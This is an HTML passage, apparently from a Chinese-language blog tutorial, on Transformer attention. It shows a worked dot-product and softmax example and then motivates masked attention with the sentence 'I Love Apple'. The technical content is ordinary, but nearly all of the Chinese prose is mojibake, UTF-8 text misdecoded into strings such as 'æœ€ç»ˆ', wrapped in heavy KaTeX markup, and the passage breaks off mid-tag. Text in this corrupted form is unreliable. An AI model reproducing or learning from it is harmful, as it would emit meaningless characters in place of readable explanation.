<div class="math math-display"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><msub><mi>p</mi><mn>1</mn></msub><mo>=</mo><msub><mi>x</mi><mn>1</mn></msub><mo>â‹…</mo><msub><mi>x</mi><mn>1</mn></msub><mo>=</mo><mn>3.41</mn><mspace linebreak="newline"/><msub><mi>p</mi><mn>2</mn></msub><mo>=</mo><msub><mi>x</mi><mn>1</mn></msub><mo>â‹…</mo><msub><mi>x</mi><mn>2</mn></msub><mo>=</mo><mn>0.19</mn><mspace linebreak="newline"/><msub><mi>p</mi><mn>3</mn></msub><mo>=</mo><msub><mi>x</mi><mn>1</mn></msub><mo>â‹…</mo><msub><mi>x</mi><mn>3</mn></msub><mo>=</mo><mn>2.04</mn><mspace linebreak="newline"/><mi>q</mi><mo>=</mo><mtext>softmax</mtext><mo stretchy="false">(</mo><mi>p</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">p_{1} = x_{1} \cdot x_{1} = 3.41
\\ p_{2} = x_{1} \cdot x_{2} = 0.19
\\ p_{3} = x_{1} \cdot x_{3} = 2.04
\\ q = \text{softmax}(p)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"/><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:0.5945em;vertical-align:-0.15em;"/><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">â‹…</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"/><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:0.6444em;"/><span class="mord">3.41</span></span><span class="mspace newline"/><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"/><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:0.5945em;vertical-align:-0.15em;"/><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">â‹…</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"/><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:0.6444em;"/><span class="mord">0.19</span></span><span class="mspace newline"/><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"/><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">3</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:0.5945em;vertical-align:-0.15em;"/><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">â‹…</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"/><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">3</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:0.6444em;"/><span class="mord">2.04</span></span><span class="mspace newline"/><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"/><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord text"><span class="mord">softmax</span></span><span class="mopen">(</span><span class="mord mathnormal">p</span><span class="mclose">)</span></span></span></span></span></div>
<p>æœ€ç»ˆï¼Œæˆ‘ä»¬ä¾¿å¾—åˆ°äº†ç”¨äºåŠ æƒæ±‚å’Œçš„æ³¨æ„åŠ›æƒé‡ <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>q</mi></mrow><annotation encoding="application/x-tex">q</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"/><span class="mord mathnormal" style="margin-right:0.03588em;">q</span></span></span></span></span>ã€‚è¿™ä¸ªè¿‡ç¨‹ç›´è§‚ä¸Šå°±æ˜¯ï¼š<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>y</mi><mn>1</mn></msub></mrow><annotation encoding="application/x-tex">y_{1}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span></span></span> çš„ç”Ÿæˆï¼Œæ˜¯åŸºäºâ€œ<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>x</mi><mn>1</mn></msub></mrow><annotation encoding="application/x-tex">x_{1}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"/><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span></span></span> ä¸åºåˆ—ä¸­æ¯ä¸ªå…ƒç´ ç›¸ä¼¼åº¦â€æ‰€å†³å®šçš„æ³¨æ„åŠ›åˆ†é…ã€‚ <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>y</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">y_{2}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span></span></span>å’Œ <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>y</mi><mn>3</mn></msub></mrow><annotation encoding="application/x-tex">y_{3}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">3</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span></span></span> çš„ç”Ÿæˆè¿‡ç¨‹å®Œå…¨åŒç†ï¼Œåªæ˜¯åˆ†åˆ«ä»¥ <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>x</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">x_{2}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"/><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span></span></span> å’Œ <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>x</mi><mn>3</mn></msub></mrow><annotation encoding="application/x-tex">x_{3}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"/><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">3</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span></span></span> ä½œä¸ºæŸ¥è¯¢çš„ä¸­å¿ƒã€‚</p>
<p align="center"><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ee96cecb211f46bdb9ff8042626f44c2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTmFycmFzdG9yeQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766470318&amp;x-signature=7jh7bLBUkPUVo1ejsQgrsBSCMuE%3D" alt="c6.jpg" width="100%" loading="lazy"/></p>
<p>æœ€åï¼Œæˆ‘ä»¬å†å›è¿‡å¤´çœ‹åˆ°é‚£ä¸ªè¾“å‡ºçŸ©é˜µ<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>Y</mi></mrow><annotation encoding="application/x-tex">Y</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span></span></span></span></span>ï¼Œå…¶ä¸­çš„æ¯ä¸€ä¸ªå‘é‡ <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>y</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">y_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span></span></span> éƒ½æ˜¯åºåˆ—ä¿¡æ¯èåˆåçš„ç»“æœï¼Œå®ƒä»£è¡¨äº†ä¸€ç§ä»¥è‡ªèº«ä¸ºè§†è§’ã€å¯¹æ•´ä¸ªåºåˆ—çš„æ³¨æ„åŠ›èšç„¦ã€‚</p>
<p>ä»¥ä¸Šæˆ‘ä»¬è®²è§£äº†æ ‡å‡†çš„æ³¨æ„åŠ›è®¡ç®—è¿‡ç¨‹ï¼Œå®ƒè®©åºåˆ—ä¸­çš„æ¯ä¸ªè¯éƒ½èƒ½â€œçœ‹åˆ°â€æ•´ä¸ªåºåˆ—çš„æ‰€æœ‰ä¿¡æ¯ã€‚ç„¶è€Œï¼Œè¿™ç§â€œå…¨çŸ¥è§†è§’â€åœ¨<strong>åºåˆ—ç”Ÿæˆä»»åŠ¡</strong>ï¼ˆå¦‚å¯¹è¯ã€æ–‡æœ¬åˆ›ä½œï¼‰ä¸­å´ä¼šå¸¦æ¥ä¸€ä¸ªæ ¹æœ¬æ€§é—®é¢˜â€”â€”ä¿¡æ¯æ³„æ¼ã€‚</p>
<p>ä¸€éƒ¨ç²¾å½©çš„æ‚¬ç–‘ç”µå½±ä¹‹æ‰€ä»¥å¸å¼•äººï¼Œåœ¨äºè§‚ä¼—å’Œä¸»è§’ä¸€æ ·ï¼Œå¯¹æœªæ¥çš„å‰§æƒ…ä¸€æ— æ‰€çŸ¥ï¼Œåªèƒ½æ ¹æ®å·²å‘ˆç°çš„çº¿ç´¢è¿›è¡Œæ¨æµ‹å’ŒæœŸå¾…ã€‚å¦‚æœè§‚ä¼—æå‰çŸ¥é“äº†å‡¶æ‰‹æ˜¯è°ï¼ˆå³è·å¾—äº†â€œæœªæ¥ä¿¡æ¯â€ï¼‰ï¼Œé‚£ä¹ˆæ•´ä¸ªè§‚å½±çš„æ¨ç†è¿‡ç¨‹å’Œæ‚¬å¿µå°±è¡ç„¶æ— å­˜ã€‚Transformer åœ¨ç”Ÿæˆæ–‡æœ¬æ—¶ä¹Ÿæ˜¯å¦‚æ­¤ï¼šå®ƒåº”è¯¥åƒä¸€ä¸ªâ€œå®æ—¶ç¼–å‰§â€ï¼Œåªèƒ½åŸºäº<strong>å·²ç»å†™å‡ºçš„å‰§æƒ…</strong>æ¥æ„æ€ä¸‹ä¸€å¥è¯ã€‚</p>
<p>ä»æŠ€æœ¯è§†è§’çœ‹ï¼Œé—®é¢˜å…·ä½“ä½•åœ¨ï¼Ÿæˆ‘ä»¬ä»¥è®­ç»ƒä¸€ä¸ªæç®€ç‰ˆ ChatGPT æ¥ç”Ÿæˆ â€œI Love Appleâ€ è¿™å¥è¯ä¸ºä¾‹ã€‚åœ¨è®­ç»ƒæ—¶ï¼Œæˆ‘ä»¬ä¼šå°†å®Œæ•´çš„å¥å­è¾“å…¥æ¨¡å‹ï¼Œå¹¶è®©æ¨¡å‹å­¦ä¹ é¢„æµ‹ä¸‹ä¸€ä¸ªè¯ï¼š</p>
<ul>
<li>å½“æ¨¡å‹çœ‹åˆ° <code>â€œIâ€</code> æ—¶ï¼Œå®ƒåº”è¯¥å­¦ä¹ é¢„æµ‹ <code>â€œLoveâ€</code>ã€‚</li>
<li>å½“æ¨¡å‹çœ‹åˆ° <code>â€œI Loveâ€</code> æ—¶ï¼Œå®ƒåº”è¯¥å­¦ä¹ é¢„æµ‹ <code>â€œAppleâ€</code>ã€‚</li>
</ul>
<p>å…³é”®åœ¨äºï¼Œåœ¨æ ‡å‡†æ³¨æ„åŠ›ä¸‹ï¼Œè®¡ç®— <code>â€œLoveâ€</code> è¿™ä¸ªè¯çš„è¡¨ç¤º <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>y</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">y_{2}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span></span></span> æ—¶ï¼Œå®ƒä¼šä¸åŒ…æ‹¬ <code>â€œAppleâ€</code> (<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>x</mi><mn>3</mn></msub></mrow><annotation encoding="application/x-tex">x_{3}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"/><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">3</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span></span></span>) åœ¨å†…çš„æ‰€æœ‰è¯è®¡ç®—æ³¨æ„åŠ›ã€‚è¿™æ„å‘³ç€ï¼Œ<strong>æ¨¡å‹åœ¨è®­ç»ƒé¢„æµ‹ <code>â€œLoveâ€</code> çš„ä¸‹ä¸€ä¸ªè¯æ—¶ï¼Œå·²ç»â€œå·çœ‹â€åˆ°äº†ç­”æ¡ˆ <code>â€œAppleâ€</code></strong>ã€‚è¿™å°±åƒè€ƒè¯•æ—¶ç›´æ¥æŠŠæ ‡å‡†ç­”æ¡ˆæ”¾åœ¨è€ƒå·ä¸Šï¼Œæ¨¡å‹æ— éœ€è´¹åŠ›â€œæ€è€ƒâ€å’Œâ€œæ¨ç†â€ï¼Œåªéœ€ç®€å•åœ°å°†æ³¨æ„åŠ›é«˜åº¦é›†ä¸­åœ¨ä¸‹ä¸€ä¸ªè¯ä¸Šå³å¯ã€‚è¿™ç§æ•°æ®æ³„æ¼ä¼šå¯¼è‡´æ¨¡å‹æ— æ³•å­¦ä¼šçœŸæ­£çš„è¯­è¨€å»ºæ¨¡èƒ½åŠ›ã€‚</p>
<p>é‚£ä¹ˆï¼Œå¦‚ä½•ä¸ºæ¨¡å‹æˆ´ä¸Šâ€œçœ¼ç½©â€ï¼Œå±è”½æœªæ¥çš„ä¿¡æ¯å‘¢ï¼Ÿè§£å†³æ–¹æ¡ˆå°±æ˜¯ <strong>æ©ç æ³¨æ„åŠ›ï¼ˆMasked Attentionï¼‰</strong>ã€‚</p>
<p>å…¶æ ¸å¿ƒæ€æƒ³éå¸¸ç›´è§‚ï¼š<strong>åœ¨è®¡ç®—æŸä¸ªä½ç½®çš„è¾“å‡ºæ—¶ï¼Œåªå…è®¸å®ƒå…³æ³¨è¯¥ä½ç½®ä¹‹å‰ï¼ˆåŒ…æ‹¬è‡ªèº«ï¼‰çš„æ‰€æœ‰ä½ç½®</strong>ã€‚å…·ä½“æ¥è¯´ï¼š</p>
<ul>
<li>è®¡ç®—  <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>y</mi><mn>1</mn></msub></mrow><annotation encoding="application/x-tex">y_{1}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span></span></span>  (å¯¹åº” <code>â€œIâ€</code>) æ—¶ï¼Œåªå…è®¸å…³æ³¨ <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>x</mi><mn>1</mn></msub></mrow><annotation encoding="application/x-tex">x_{1}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"/><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span></span></span></li>
<li>è®¡ç®—  <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>y</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">y_{2}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span></span></span>  (å¯¹åº” <code>â€œLoveâ€</code>) æ—¶ï¼Œåªå…è®¸å…³æ³¨ <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>x</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>x</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">x_{1},x_{2}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"/><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span></span></span></li>
<li>è®¡ç®—  <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>y</mi><mn>3</mn></msub></mrow><annotation encoding="application/x-tex">y_{3}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">3</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span></span></span>  (å¯¹åº” <code>â€œAppleâ€</code>) æ—¶ï¼Œæ‰å…è®¸å…³æ³¨å…¨éƒ¨ <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>x</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>x</mi><mn>2</mn></msub><mo separator="true">,</mo><msub><mi>x</mi><mn>3</mn></msub></mrow><annotation encoding="application/x-tex">x_{1},x_{2},x_{3}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"/><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord 